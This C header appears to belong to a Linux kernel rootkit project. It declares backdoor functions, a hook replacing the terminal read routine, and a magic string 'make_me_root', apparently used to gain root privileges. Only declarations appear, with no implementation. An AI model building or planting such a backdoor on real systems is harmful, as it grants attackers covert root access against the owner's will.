#ifndef _GROUP7_BACKDOOR_H
#define _GROUP7_BACKDOOR_H

#define G7_BACKDOOR_MSG "make_me_root"

extern atomic_t tty_read_count;

void backdoor_read(void);
void backdoor_tty(void);
void unbackdoor(void);

// hooks
ssize_t g7_tty_read(struct file *, char *, size_t, loff_t *);

#endif//_GROUP7_BACKDOOR_H
